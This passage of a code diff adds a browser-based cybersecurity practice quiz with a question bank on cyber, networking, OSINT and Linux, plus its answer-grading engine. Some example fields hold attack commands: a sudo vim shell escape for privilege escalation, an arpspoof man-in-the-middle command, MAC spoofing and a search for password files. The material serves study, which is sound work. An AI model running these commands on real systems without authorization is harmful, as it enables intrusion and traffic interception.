+  {type:"scenario",topic:"cyber",diff:3,q:"A company discovers that an employee has been slowly copying sensitive files to a personal USB drive over several months. What type of threat is this?",a:"insider threat",alts:["insider","internal threat"],hint:"The threat comes from within the organization.",explain:"Insider threats come from people with legitimate access — employees, contractors, partners. They're especially dangerous because they bypass perimeter defenses. Detection requires monitoring tools like DLP (Data Loss Prevention) and UEBA (User Entity Behavior Analytics)."},
+  {type:"flashcard",topic:"cyber",diff:3,q:"What is privilege escalation?",a:"gaining higher access levels than originally authorized",alts:["elevating permissions beyond what was granted","going from normal user to admin access","escalating from low-level to high-level access"],hint:"Moving from regular user to admin, for example.",explain:"After gaining initial access (often as a low-privilege user), attackers escalate privileges to admin/root. Methods include exploiting SUID binaries, kernel vulnerabilities, misconfigured sudo rules, or credential harvesting.",example:"# Check for easy privilege escalation\n$ sudo -l\n(ALL) NOPASSWD: /usr/bin/vim\n# vim can spawn a shell!\n$ sudo vim -c ':!sh'"},
+  {type:"flashcard",topic:"networking",diff:3,q:"What does it mean to spoof a MAC address?",a:"a device pretends to be another by faking its mac address",alts:["faking a mac address to impersonate another device"],hint:"Hackers use this to bypass firewalls.",explain:"MAC spoofing changes your NIC's hardware address in software. Attackers use it to bypass MAC-based network access control, impersonate authorized devices, or avoid tracking.",example:"# Spoof on Linux\n$ sudo macchanger -r eth0\nNew MAC: 3a:1f:c7:22:a9:b5"},
+  {type:"scenario",topic:"networking",diff:3,q:"A hacker on a guest Wi-Fi network is bypassing the MAC address filter by pretending their device is an approved administrator machine. What technique is this called?",a:"mac spoofing",alts:["spoofing","mac address spoofing"],hint:"MAC addresses can be faked in software.",explain:"MAC filtering is a weak security control because MAC addresses are trivially spoofable. The attacker sniffs the network to find allowed MACs, then changes theirs to match. Real security requires 802.1X (RADIUS) authentication."},
+  {type:"flashcard",topic:"networking",diff:3,q:"What are the 7 layers of the OSI model in order from bottom to top?",a:"physical data link network transport session presentation application",alts:["physical, data link, network, transport, session, presentation, application"],hint:"Please Do Not Throw Sausage Pizza Away.",explain:"The OSI model is a conceptual framework for understanding network communication. Each layer has a specific job: Physical (cables), Data Link (MAC/switches), Network (IP/routing), Transport (TCP/UDP), Session, Presentation, Application (HTTP/DNS).",example:"Mnemonic: Please Do Not Throw Sausage Pizza Away\nLayer 1: Physical (cables, signals)\nLayer 2: Data Link (MAC, switches)\nLayer 3: Network (IP, routers)\nLayer 4: Transport (TCP/UDP)\nLayer 7: Application (HTTP, DNS)"},
+  {type:"scenario",topic:"networking",diff:3,q:"A server is receiving thousands of fake requests per second from many different IP addresses, causing it to crash. What type of attack is this?",a:"ddos",alts:["distributed denial of service","denial of service","dos"],hint:"Distributed = many sources. Denial of Service = overwhelming the target.",explain:"A DDoS attack uses a botnet (thousands of compromised machines) to flood a target simultaneously. Because traffic comes from many IPs, simple IP blocking doesn't work. Mitigation requires services like Cloudflare or AWS Shield."},
+  {type:"flashcard",topic:"networking",diff:3,q:"What is ARP and what does it do?",a:"address resolution protocol, maps ip addresses to mac addresses on a local network",alts:["address resolution protocol","resolves ip addresses to mac addresses","maps ip to mac"],hint:"It answers: 'What MAC address belongs to this IP?'",explain:"When a device wants to communicate on a LAN, it knows the destination IP but needs the MAC address. It broadcasts an ARP request: 'Who has 192.168.1.1?' The owner replies with its MAC. This mapping is cached in the ARP table.",example:"$ arp -a\n? (192.168.1.1) at aa:bb:cc:dd:ee:ff on eth0"},
+  {type:"scenario",topic:"networking",diff:3,q:"An attacker sends fake ARP replies to associate their MAC address with the gateway's IP, intercepting all traffic. What is this attack called?",a:"arp spoofing",alts:["arp poisoning","arp cache poisoning"],hint:"Also called ARP poisoning — it corrupts the ARP table.",explain:"ARP spoofing poisons the victim's ARP cache so traffic meant for the gateway goes to the attacker instead. This enables man-in-the-middle attacks — the attacker can read, modify, or drop packets.",example:"# ARP spoofing with arpspoof\n$ sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1"},
+  {type:"flashcard",topic:"networking",diff:3,q:"What is a VPN?",a:"a virtual private network that creates an encrypted tunnel for your internet traffic",alts:["encrypts your internet connection through a secure tunnel","virtual private network, encrypts traffic between you and a server"],hint:"It hides your traffic from your ISP and local network.",explain:"A VPN encrypts all traffic between your device and a VPN server. This prevents your ISP, public Wi-Fi operators, or local attackers from seeing your traffic. In pentesting, VPNs connect you to isolated lab networks.",example:"# Connect to a VPN with OpenVPN\n$ sudo openvpn lab-network.ovpn"},
+  {type:"fillin",topic:"networking",diff:3,q:"SSH runs on port ___ by default.",a:"22",hint:"Secure Shell, used for remote command-line access.",explain:"SSH (Secure Shell) provides encrypted remote terminal access on port 22. It replaced Telnet (port 23), which sent everything in plaintext. SSH also supports file transfer (SCP/SFTP) and port tunneling.",example:"$ ssh student@192.168.1.10\nstudent@server:~$"},
+  {type:"scenario",topic:"networking",diff:3,q:"You want to see every hop your packets take on the way to google.com. What command do you run?",a:"traceroute google.com",alts:["tracert google.com"],hint:"traceroute on Linux, tracert on Windows.",explain:"Traceroute sends packets with incrementing TTL values. Each router decrements TTL and sends back an ICMP Time Exceeded when it hits zero. This reveals every hop along the path and its latency.",example:"$ traceroute google.com\n 1  192.168.1.1   1.2 ms\n 2  10.0.0.1     5.4 ms\n 3  72.14.237.1  11.8 ms\n 4  142.250.80.46 12.1 ms"},
+  {type:"scenario",topic:"osint",diff:3,q:"You're using Shodan to look for devices in Ireland. What filter do you add to your search?",a:"country:IE",hint:"Shodan uses ISO country codes.",explain:"Shodan supports filters to narrow searches: country (ISO 3166), city, org, port, product, os, and more. Combining filters helps you find specific devices — like vulnerable Apache servers in a particular country.",example:'Shodan query examples:\ncountry:IE port:22\ncountry:US org:"Amazon" apache\ncity:"Dublin" webcam'},
+  {type:"scenario",topic:"osint",diff:3,q:"You want to scope a Shodan search to only show results from Amazon Web Services. Which filter and value do you use?",a:"org:AS7224",alts:["org:amazon web services","org:aws"],hint:"Shodan's org filter accepts organization names or ASN numbers.",explain:"The org filter in Shodan matches the organization that owns the IP block. You can use the ASN (Autonomous System Number) or the organization name. AWS owns AS16509 and AS7224 among others."},
+  {type:"scenario",topic:"osint",diff:3,q:"You need to check if a domain name was used in a known phishing campaign. Besides VirusTotal, what OSINT database catalogs threat intelligence about malicious domains?",a:"abuseipdb",alts:["abuse ipdb","threatcrowd","urlhaus"],hint:"Multiple databases track abusive IPs and domains.",explain:"AbuseIPDB, URLhaus, ThreatCrowd, and PhishTank all catalog malicious indicators (IPs, domains, URLs). Security analysts cross-reference these during incident response to check if an indicator is known-bad."},
+  {type:"scenario",topic:"osint",diff:3,q:"You want to find all subdomains of a target domain for reconnaissance. What tool is commonly used for subdomain enumeration?",a:"sublist3r",alts:["subfinder","amass","knockpy"],hint:"Several tools automate subdomain discovery.",explain:"Subdomain enumeration reveals hidden attack surfaces — dev.target.com, staging.target.com, vpn.target.com. Tools query DNS, certificate transparency logs, and search engines to find subdomains without directly scanning the target.",example:"$ sublist3r -d example.com\nwww.example.com\nmail.example.com\ndev.example.com\nstaging.example.com"},
+  {type:"scenario",topic:"osint",diff:3,q:"You want to find leaked credentials associated with a target email address. What type of OSINT source would you check?",a:"data breach databases",alts:["breach databases","haveibeenpwned","have i been pwned","leaked databases"],hint:"HaveIBeenPwned is one of the most well-known.",explain:"Data breaches leak millions of credentials. HaveIBeenPwned (HIBP) lets you check if an email appeared in known breaches. In pentesting, this helps assess password reuse risk. Ethically, only check accounts you're authorized to test."},
+  {type:"flashcard",topic:"osint",diff:3,q:"What is the difference between passive and active reconnaissance?",a:"passive recon gathers info without touching the target while active recon directly interacts with the target system",alts:["passive doesn't alert the target, active does","passive is observation only, active involves direct probing"],hint:"Passive = watching from afar. Active = knocking on the door.",explain:"Passive recon (OSINT, WHOIS, Google Dorking) leaves no trace on the target. Active recon (port scanning, directory brute-forcing) sends packets to the target and can be detected. Always start passive before going active.",example:"Passive: WHOIS lookup, Shodan search, Google Dorking\nActive:  nmap port scan, dirb, vulnerability scanning"},
+  {type:"command",topic:"linux",diff:3,q:"Find all .txt files inside /home.",a:"find /home -name '*.txt'",alts:["find /home -name \"*.txt\"","find /home -name *.txt"],hint:"Use find with the -name flag and a wildcard.",explain:"find recursively searches a directory tree for files matching criteria. -name uses glob patterns, -type f limits to files, -mtime filters by modification time. It's one of the most powerful Linux commands.",example:"$ find /home -name '*.txt'\n/home/student/notes.txt\n/home/student/Documents/todo.txt"},
+  {type:"command",topic:"linux",diff:3,q:"Search for the IP address 81.143.211.90 inside access.log.",a:'grep "81.143.211.90" access.log',alts:["grep '81.143.211.90' access.log","grep 81.143.211.90 access.log"],hint:"grep searches inside file contents.",explain:"grep searches file contents for a pattern and prints matching lines. It supports regex, case-insensitive search (-i), line counts (-c), and inverted matching (-v). Essential for log analysis.",example:'$ grep "81.143.211.90" access.log\n81.143.211.90 - - [14/May/2026:10:23:01] "GET /admin HTTP/1.1" 200'},
+  {type:"command",topic:"linux",diff:3,q:"Recursively search every file in /etc/ for the string PRETTY_NAME.",a:'grep -R "PRETTY_NAME" /etc/',alts:["grep -R 'PRETTY_NAME' /etc/","grep -R PRETTY_NAME /etc/"],hint:"The -R flag makes grep search all subfolders.",explain:"-R makes grep descend into all subdirectories. This is useful for finding configuration values, API keys, or strings across an entire directory tree. Add -l to show only filenames instead of matching lines.",example:'$ grep -R "PRETTY_NAME" /etc/\n/etc/os-release:PRETTY_NAME="Ubuntu 22.04.3 LTS"'},
+  {type:"command",topic:"linux",diff:3,q:"Create a folder called new_folder AND navigate into it — but only navigate in if the folder was created successfully.",a:"mkdir new_folder && cd new_folder",hint:"&& chains commands — second runs only if first succeeds.",explain:"&& is the AND operator — the second command runs only if the first exits with status 0 (success). Compare with ; which runs the second command regardless, and || which runs it only on failure.",example:"$ mkdir new_folder && cd new_folder\n$ pwd\n/home/student/new_folder\n\n# If mkdir fails (folder exists), cd won't run:\n$ mkdir new_folder && cd new_folder\nmkdir: cannot create directory: File exists"},
+  {type:"command",topic:"linux",diff:3,q:"Search the entire system for a file named passwords.txt.",a:"find / -name 'passwords.txt'",alts:["find / -name \"passwords.txt\"","find / -name passwords.txt"],hint:"Start from / to search the whole filesystem.",explain:"Starting find at / searches the entire filesystem. This can be slow and produce permission errors. Add 2>/dev/null to suppress errors, or use -type f to search only files.",example:"$ find / -name 'passwords.txt' 2>/dev/null\n/var/www/html/backup/passwords.txt"},
+  {type:"scenario",topic:"linux",diff:3,q:"You need to copy a huge ISO file to a backup drive, but you want your terminal to stay free while it runs. Which shell operator do you use at the end of the command?",a:"&",hint:"One ampersand sends a process to the background.",explain:"& at the end of a command runs it in the background, returning your terminal prompt immediately. The process continues running. Use jobs to see background tasks and fg to bring one back to the foreground.",example:"$ cp large-file.iso /mnt/backup/ &\n[1] 12345\n$ jobs\n[1]+  Running  cp large-file.iso /mnt/backup/ &"},
+  {type:"scenario",topic:"linux",diff:3,q:"You run `grep 'admin' users.txt` and get hundreds of results. What command would you pipe it to (or run first) to find out exactly how many lines matched?",a:"wc -l",alts:["grep 'admin' users.txt | wc -l"],hint:"wc -l counts lines.",explain:"Piping grep output to wc -l counts the matching lines. The pipe (|) sends stdout of one command into stdin of the next. This chaining is fundamental to Linux — small tools combined to do powerful things.",example:"$ grep 'admin' users.txt | wc -l\n347"},
+  {type:"scenario",topic:"linux",diff:3,q:"You want to find all files modified in the last 24 hours inside /var/log. What command do you use?",a:"find /var/log -mtime -1",alts:["find /var/log -mtime 0","find /var/log -mmin -1440"],hint:"-mtime -1 means modified less than 1 day ago.",explain:"-mtime -1 finds files modified less than 1 day ago. -mtime +7 finds files older than 7 days. For finer control, use -mmin (minutes). This is invaluable for incident response — finding what changed recently.",example:"$ find /var/log -mtime -1\n/var/log/syslog\n/var/log/auth.log\n/var/log/apache2/access.log"},
+  {type:"scenario",topic:"linux",diff:3,q:"You want to see which process is listening on port 8080. What command do you run?",a:"netstat -tlnp | grep 8080",alts:["ss -tlnp | grep 8080","lsof -i :8080"],hint:"netstat or ss can show listening ports; pipe to grep to filter.",explain:"netstat -tlnp shows all TCP listening ports with process info. ss is the modern replacement. lsof -i :PORT is another option. These are essential for finding what services are running and on which ports.",example:"$ ss -tlnp | grep 8080\nLISTEN  0  128  *:8080  *:*  users:((\"python3\",pid=1234))"},
+  {type:"command",topic:"linux",diff:3,q:"Change the permissions of script.sh so that only the owner can read, write, and execute it.",a:"chmod 700 script.sh",alts:["chmod u=rwx,go= script.sh"],hint:"7 = rwx for owner, 0 = nothing for group and others.",explain:"chmod changes file permissions. In octal notation: 7=rwx, 6=rw-, 5=r-x, 4=r--, 0=---. The three digits are owner, group, others. 700 gives the owner full access and no one else gets anything.",example:"$ chmod 700 script.sh\n$ ls -l script.sh\n-rwx------ 1 student student 256 Jan 1 script.sh\n# Only the owner can read, write, or execute"}
+];
+
+// ════════════════════════════════════════════════════════
+// GRADING ENGINE
+// ════════════════════════════════════════════════════════
+
+const output = document.getElementById('output');
+const inputLine = document.getElementById('input-line');
+const userInput = document.getElementById('user-input');
+const terminal = document.getElementById('terminal');
+
+let state = 'boot';
+let selectedTopic = null;
+let typing = false;
+
+// Session state
+let tiers = { 1: [], 2: [], 3: [] };
+let currentDiff = 1;
+let tierIndex = 0;
+let missedQueue = [];
+let inRetry = false;
+let retryIndex = 0;
+let questionNum = 0;
+let totalQuestions = 0;
+let stats = { correct: 0, total: 0, streak: 0, streakNotified: false };
+
+function normalize(str) {
+  return str.toLowerCase().trim().replace(/\s+/g, ' ').replace(/^["']|["']$/g, '');
+}
+
+const STOP_WORDS = new Set([
+  'a','an','the','is','are','was','were','it','its','of','to','in','on','for',
+  'and','or','but','not','that','this','with','by','from','as','at','be','do',
+  'does','did','has','have','had','can','could','will','would','should','may',
+  'you','your','they','them','their','he','she','we','our','i','my','me',
+  'what','which','who','whom','how','when','where','why',
+  'also','just','very','then','than','so','if','about','into','through',
+  'been','being','each','other','some','such','no','nor','only','own',
+  'same','too','used','using','use','like','before','after','while',
+  'between','up','down','out','over','under','more','most','get','gets',
+  'got','make','makes','made','let','lets','way','think','called','means',
+  'basically','essentially','simply','something','thing','things','kind',
+  'type','types','allows','allow','another','because','since','during'
+]);
+
+const SYNONYMS = {
+  'weakness': ['flaw','vulnerability','vuln','weak','deficiency','weak point','hole','bug','weaknesses','vulnerabilities'],
+  'vulnerability': ['weakness','flaw','vuln','weak','weak point','hole','bug','vulnerabilities','weaknesses'],
+  'exploit': ['take advantage','abuse','leverage','attack'],
+  'attacker': ['hacker','adversary','threat actor','bad actor','malicious user','bad guy'],
+  'hacker': ['attacker','adversary','threat actor','bad actor'],
+  'malicious': ['harmful','dangerous','bad','evil'],
+  'fake': ['spoof','forge','falsify','impersonate','pretend','counterfeit'],
+  'spoof': ['fake','forge','falsify','impersonate','pretend'],
+  'authorized': ['legal','legitimate','permitted','approved','sanctioned','permission'],
+  'legal': ['authorized','legitimate','permitted','lawful'],
+  'identify': ['recognize','detect','find','locate','discover'],
+  'find': ['discover','locate','detect','identify','uncover'],
+  'hidden': ['concealed','secret','obscured','unlisted'],
+  'network': ['net'],
+  'internet': ['web','online'],
+  'device': ['machine','system','host','computer'],
+  'software': ['program','application','app','tool'],
+  'overwrite': ['replace','erase','destroy','wipe','overwritten'],
+  'overwritten': ['replaced','erased','destroyed','wiped','lost','deleted','overwrite','gone'],
+  'search': ['scan','look','find','query','hunt'],
+  'monitor': ['watch','track','observe'],
+  'filter': ['block','control','restrict','screen'],
+  'trick': ['deceive','fool','manipulate','mislead','social engineering'],
+  'steal': ['capture','harvest','exfiltrate','grab','take','get'],
+  'credentials': ['passwords','logins','authentication','creds','info','data'],
+  'scan': ['search','probe','survey','check'],
+  'automatic': ['automated','auto','automatically'],
+  'automated': ['automatic','auto','automatically'],
+  'database': ['catalogue','catalog','dictionary','registry','repository','list'],
+  'dictionary': ['database','catalogue','catalog','registry','list'],
+  'information': ['info','data','details'],
+  'info': ['information','data','details'],
+  'reveal': ['expose','show','give','disclose','leak','share','surrender'],
+  'sensitive': ['private','confidential','secret','personal'],
+  'user': ['person','people','victim','target','individual','someone'],
+  'people': ['users','persons','victims','individuals'],
+  'message': ['email','communication','notification'],
+  'email': ['message','mail'],
+  'engineering': ['manipulation'],
+  'social': ['human','psychological'],
+  'address': ['addr','location'],
+  'unique': ['specific','distinct','individual'],
+  'identifier': ['id','label','name','tag','number'],
+  'known': ['documented','recorded','cataloged','public'],
+  'traffic': ['packets','data','connections','requests'],
+  'rules': ['policies','criteria','conditions'],
+  'test': ['check','verify','evaluate','assess','examine'],
+  'defense': ['security','protection','safeguard'],
+  'protect': ['defend','secure','guard','safeguard'],
+  'connected': ['attached','linked','joined','online'],
+  'translate': ['convert','resolve','map','transform'],
+  'aggregate': ['combine','collect','gather','consolidate','compile'],
+  'crash': ['fail','go down','stop working','break'],
+  'request': ['query','call','packet'],
+  'patch': ['fix','update','repair'],
+  'unknown': ['undiscovered','undetected','new','novel'],
+  'vendor': ['developer','maker','creator','company','manufacturer'],
+  'take': ['steal','grab','capture','seize'],
+  'advantage': ['exploit','leverage','benefit'],
+  'practice': ['process','act','activity','discipline','approach','method'],
+  'acting': ['behaving','pretending','operating','working'],
+  'thinking': ['reasoning','approaching','analyzing'],
+  'giving': ['revealing','disclosing','surrendering','handing','sharing'],
+  'vulnerabilities': ['weaknesses','flaws','holes','bugs','vulns'],
+  'encrypt': ['encode','scramble','cipher','secure'],
+  'encrypted': ['encoded','scrambled','ciphered','secured'],
+  'tunnel': ['channel','connection','pipe'],
+  'inject': ['insert','embed','place'],
+  'input': ['field','form','entry'],
+  'script': ['code','javascript','js'],
+  'disguised': ['hidden','masked','camouflaged','pretending'],
+  'elevated': ['higher','increased','escalated','raised'],
+  'access': ['permission','privilege','entry','control'],
+  'internal': ['insider','inside','within'],
+};
+
+function stemWord(w) {
+  return w.replace(/(ing|ed|er|es|ly|tion|sion|ment|ness|ful|less|ize|ise|ous|ive|able|ible|al|ial|ity)$/, '');
+}
+
+function extractKeywords(str) {
+  return normalize(str)
+    .replace(/[^a-z0-9+\-/._ ]/g, '')
+    .split(' ')
+    .filter(w => w.length > 1 && !STOP_WORDS.has(w));
+}
+
+function synMatch(w1, w2) {
+  const check = (a, b) => {
+    const syns = SYNONYMS[a];
+    if (!syns) return false;
+    return syns.some(s => {
+      if (s === b) return true;
+      if (s.split(' ').includes(b)) return true;
+      const stemB = stemWord(b);
+      const stemS = stemWord(s);
+      if (stemB.length > 2 && stemS.length > 2 && stemB === stemS) return true;
+      return false;
+    });
+  };
+  return check(w1, w2) || check(w2, w1);
+}
+
+function wordsMatch(word1, word2) {
+  if (word1 === word2) return true;
+  if (word1.length > 3 && word2.length > 3) {
+    if (word1.startsWith(word2.slice(0, -1)) || word2.startsWith(word1.slice(0, -1))) return true;
+  }
+  if (word1.length > 2 && word2.length > 2) {
+    const stem1 = stemWord(word1);
+    const stem2 = stemWord(word2);
+    if (stem1.length > 2 && stem2.length > 2 && stem1 === stem2) return true;
+    if (synMatch(word1, word2)) return true;
+    if (stem1 !== word1 && synMatch(stem1, word2)) return true;
+    if (stem2 !== word2 && synMatch(word1, stem2)) return true;
+    if (stem1 !== word1 && stem2 !== word2 && synMatch(stem1, stem2)) return true;
+  }
+  return false;
+}
+
+function keywordScore(userStr, correctStr) {
+  const correctKw = extractKeywords(correctStr);
+  if (correctKw.length === 0) return 1;
+  const userKw = extractKeywords(userStr);
+  let matched = 0;
+  for (const ck of correctKw) {
+    if (userKw.some(uk => wordsMatch(uk, ck))) matched++;
+  }
+  return matched / correctKw.length;
+}
+
+function checkAnswer(userAns, question) {
+  const norm = normalize(userAns);
+  const correctNorm = normalize(question.a);
+
+  if (norm === correctNorm) return true;
+
+  if (question.alts) {
+    for (const alt of question.alts) {
+      if (norm === normalize(alt)) return true;
+    }
+  }
+
+  if (question.type === 'command') {
+    const normCmd = norm.replace(/["']/g, '');
+    const correctCmd = correctNorm.replace(/["']/g, '');
+    if (normCmd === correctCmd) return true;
+    if (question.alts) {
+      for (const alt of question.alts) {
+        if (normCmd === normalize(alt).replace(/["']/g, '')) return true;
+      }
+    }
+    return false;
+  }
+
+  if (question.type === 'fillin') {
+    if (correctNorm.split(' ').length === 1) {
+      if (wordsMatch(norm, correctNorm)) return true;
+      if (norm.includes(correctNorm) || correctNorm.includes(norm)) return true;
+    }
+    if (question.alts) {
+      for (const alt of question.alts) {
+        const aN = normalize(alt);
+        if (wordsMatch(norm, aN)) return true;
+        if (norm.includes(aN) || aN.includes(norm)) return true;
+      }
+    }
+    return false;
+  }
+
+  const threshold = correctNorm.split(' ').length <= 4 ? 0.7 : 0.55;
+
+  const score = keywordScore(norm, correctNorm);
+  if (score >= threshold) return true;
+
+  if (question.alts) {
+    for (const alt of question.alts) {
+      const altScore = keywordScore(norm, alt);
+      if (altScore >= threshold) return true;
+    }
+  }
+
+  const userKw = extractKeywords(norm);
+  const correctKw = extractKeywords(correctNorm);
+  const reverseScore = correctKw.length > 0 ? keywordScore(correctNorm, norm) : 0;
+  if (reverseScore >= 0.6 && score >= 0.35) return true;
+  if (userKw.length <= 4 && reverseScore >= 0.75) return true;
+  const combined = (score + reverseScore) / 2;
+  if (combined >= 0.55 && score >= 0.3) return true;
+
+  return false;
+}
+
+// ════════════════════════════════════════════════════════
+// SESSION ENGINE
+// ════════════════════════════════════════════════════════
+
+function shuffleArray(arr) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
+}
+
+function buildSession(topic) {
+  let pool;
+  if (topic === 'all') pool = [...questions];
+  else pool = questions.filter(q => q.topic === topic);
+
+  tiers = {
+    1: shuffleArray(pool.filter(q => q.diff === 1)),
+    2: shuffleArray(pool.filter(q => q.diff === 2)),
+    3: shuffleArray(pool.filter(q => q.diff === 3))
+  };
+  currentDiff = 1;
+  tierIndex = 0;
+  missedQueue = [];
+  inRetry = false;
+  retryIndex = 0;
+  questionNum = 0;
+  totalQuestions = tiers[1].length + tiers[2].length + tiers[3].length;
+}
+
+function getCurrentQuestion() {
+  if (inRetry) {
+    return retryIndex < missedQueue.length ? missedQueue[retryIndex] : null;
+  }
+  return tierIndex < tiers[currentDiff].length ? tiers[currentDiff][tierIndex] : null;
+}
+
+function getDiffLabel(diff) {
+  switch(diff) {
+    case 1: return 'EASY';
+    case 2: return 'MEDIUM';
+    case 3: return 'HARD';
+    default: return '';
+  }
+}
+
+function getDiffClass(diff) {
+  switch(diff) {
+    case 1: return 'green';
+    case 2: return 'yellow';
+    case 3: return 'red';
+    default: return '';
+  }
+}
+
+function addLine(text, cls) {
+  const div = document.createElement('div');
+  div.className = 'line' + (cls ? ' ' + cls : '');
+  div.textContent = text;
+  output.appendChild(div);
+  scrollToBottom();
+}
+
+function addHtmlLine(html, cls) {
+  const div = document.createElement('div');
+  div.className = 'line' + (cls ? ' ' + cls : '');
+  div.innerHTML = html;
+  output.appendChild(div);
+  scrollToBottom();
+}
+
+function scrollToBottom() {
+  terminal.scrollTop = terminal.scrollHeight;
+}
+
+function typeText(text, cls) {
+  return new Promise(resolve => {
+    typing = true;
+    const div = document.createElement('div');
+    div.className = 'line cursor-blink' + (cls ? ' ' + cls : '');
+    output.appendChild(div);
+    scrollToBottom();
+    let i = 0;
+    const interval = setInterval(() => {
+      if (i < text.length) {
+        div.textContent += text[i];
+        i++;
+        scrollToBottom();
+      } else {
+        clearInterval(interval);
+        div.classList.remove('cursor-blink');
+        typing = false;
+        resolve();
+      }
+    }, 18);
+  });
+}
+
+function showInput() {
+  inputLine.style.display = 'flex';
+  userInput.value = '';
+  userInput.focus();
+  scrollToBottom();
+}
+
+function hideInput() {
+  inputLine.style.display = 'none';
+}
+
+function recordInput(val) {
+  const div = document.createElement('div');
+  div.className = 'line';
+  div.innerHTML = '<span class="cyan">$&gt;</span> ' + escapeHtml(val);
+  output.appendChild(div);
+  scrollToBottom();
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function getTypeTag(type) {
+  switch(type) {
+    case 'flashcard': return '[FLASHCARD]';
+    case 'fillin': return '[FILL-IN]';
+    case 'command': return '[COMMAND]';
+    case 'scenario': return '[SCENARIO]';
+    default: return '[QUESTION]';
+  }
+}
+
+async function boot() {
+  await typeText('[BOOT] CyberSec Practice Terminal v1.0');
+  await typeText('[INIT] Loading question bank... OK');
+  await typeText('[INIT] Randomizing exercise order... OK');
+  await typeText('[OK]   System ready.');
+  await typeText('');
+  await typeText('Welcome, student. Let\'s drill your notes.');
+  await typeText('Master each difficulty to advance: EASY → MEDIUM → HARD.');
+  await typeText('Missed questions repeat until you get them right.');
+  await typeText('');
+  showMenu();
+}
+
+async function showMenu() {
+  state = 'menu';
+  await typeText('Select a topic to practice:');
+  await typeText('  [1] All Topics');
+  await typeText('  [2] Intro to Cyber');
+  await typeText('  [3] Intro to Networking');
+  await typeText('  [4] OSINT & Research Tools');
+  await typeText('  [5] Linux Fundamentals');
+  await typeText('');
+  showInput();
+}
+
+async function askQuestion() {
+  const q = getCurrentQuestion();
+  if (!q) {
+    if (inRetry || missedQueue.length === 0) {
+      if (currentDiff < 3) {
+        currentDiff++;
+        tierIndex = 0;
+        missedQueue = [];
+        inRetry = false;
+        retryIndex = 0;
+        await new Promise(r => setTimeout(r, 600));
+        const label = getDiffLabel(currentDiff);
+        const cls = getDiffClass(currentDiff);
+        addLine('');
+        await typeText('[LEVEL UP] All ' + getDiffLabel(currentDiff - 1) + ' questions cleared! Advancing to ' + label + '...', cls);
+        addLine('');
+        askQuestion();
+        return;
+      } else {
+        await showEndScreen();
+        return;
+      }
+    } else {
+      inRetry = true;
+      retryIndex = 0;
+      shuffleArray(missedQueue);
+      addLine('');
+      await typeText('[RETRY] You missed ' + missedQueue.length + ' question' + (missedQueue.length > 1 ? 's' : '') + '. Let\'s try ' + (missedQueue.length > 1 ? 'them' : 'it') + ' again.', 'yellow');
+      addLine('');
+      askQuestion();
+      return;
+    }
+  }
+
+  state = 'question';
+  questionNum++;
+  const diffLabel = getDiffLabel(q.diff);
+  const diffCls = getDiffClass(q.diff);
+  addLine('──────────────────────────', 'separator');
+  let label = '<span class="dim">Question ' + questionNum + '/' + totalQuestions + '</span>  <span class="' + diffCls + '">[' + diffLabel + ']</span>';
+  if (inRetry) label += '  <span class="yellow">[RETRY]</span>';
+  addHtmlLine(label);
+  await typeText(getTypeTag(q.type) + ' ' + q.q);
+  await typeText('');
+  showInput();
+}
+
+async function handleAnswer(input) {
+  const q = getCurrentQuestion();
+  const correct = checkAnswer(input, q);
+  stats.total++;
+
+  if (correct) {
+    stats.correct++;
+    stats.streak++;
+    addLine('✓ Correct!', 'green');
+    if (stats.streak === 10 && !stats.streakNotified) {
+      stats.streakNotified = true;
+      await typeText('[STREAK] 10 correct in a row. Solid work.');
+    }
+    if (inRetry) {
+      missedQueue.splice(retryIndex, 1);
+    } else {
+      tierIndex++;
+    }
+  } else {
+    stats.streak = 0;
+    addLine('✗ Not quite. Answer: ' + q.a, 'red');
+    if (q.hint) addLine('  ' + q.hint, 'dim');
+    if (inRetry) {
+      retryIndex++;
+    } else {
+      missedQueue.push(q);
+      tierIndex++;
+    }
+  }
+
+  if (q.explain) {
+    addLine('');
+    addLine('📖 Explanation:', 'cyan');
+    q.explain.split('\n').forEach(line => addLine('  ' + line, 'dim'));
+  }
+  if (q.example) {
+    addLine('');
+    addLine('💻 Example:', 'cyan');
+    q.example.split('\n').forEach(line => addLine('  ' + line, 'code'));
+  }
+
+  if (stats.total % 5 === 0) {
+    addLine('');
+    addLine('Score: ' + stats.correct + '/' + stats.total + ' correct', 'dim');
+  }
+
+  // Check if we finished the current tier's new questions and need retries
+  if (!inRetry && tierIndex >= tiers[currentDiff].length && missedQueue.length > 0) {
+    inRetry = true;
+    retryIndex = 0;
+    shuffleArray(missedQueue);
+    await new Promise(r => setTimeout(r, 600));
+    addLine('');
+    await typeText('[RETRY] You missed ' + missedQueue.length + ' question' + (missedQueue.length > 1 ? 's' : '') + ' in ' + getDiffLabel(currentDiff) + '. Let\'s try ' + (missedQueue.length > 1 ? 'them' : 'it') + ' again.', 'yellow');
+    addLine('');
+    await new Promise(r => setTimeout(r, 400));
+    askQuestion();
+    return;
+  }
+
+  // Check if retries are done but some still missed
+  if (inRetry && retryIndex >= missedQueue.length && missedQueue.length > 0) {
+    retryIndex = 0;
+    shuffleArray(missedQueue);
+    await new Promise(r => setTimeout(r, 600));
+    addLine('');
+    await typeText('[RETRY] Still ' + missedQueue.length + ' to go. You\'ve got this.', 'yellow');
+    addLine('');
+    await new Promise(r => setTimeout(r, 400));
+    askQuestion();
+    return;
+  }
+
+  await new Promise(r => setTimeout(r, 800));
+  askQuestion();
+}
+
+async function showEndScreen() {
+  state = 'end';
+  const pct = stats.total > 0 ? Math.round((stats.correct / stats.total) * 100) : 0;
+  addLine('');
+  addLine('══════════════════════════════');
+  await typeText('SESSION COMPLETE');
+  await typeText('Final Score: ' + stats.correct + ' / ' + stats.total);
+  await typeText('Accuracy: ' + pct + '%');
+  if (pct === 100) await typeText('[PERFECT] Flawless. You own this material.', 'green');
+  else if (pct >= 80) await typeText('[SOLID] Strong performance. Keep it up.', 'green');
+  else if (pct >= 60) await typeText('[OK] Decent, but review the ones you missed.', 'yellow');
+  else await typeText('[NEEDS WORK] Hit the notes and try again.', 'red');
+  await typeText('');
+  await typeText('[1] Practice again (same topic)');
+  await typeText('[2] Return to menu');
+  showInput();
+}
+
+function resetStats() {
+  stats = { correct: 0, total: 0, streak: 0, streakNotified: false };
+}
+
+userInput.addEventListener('keydown', async function(e) {
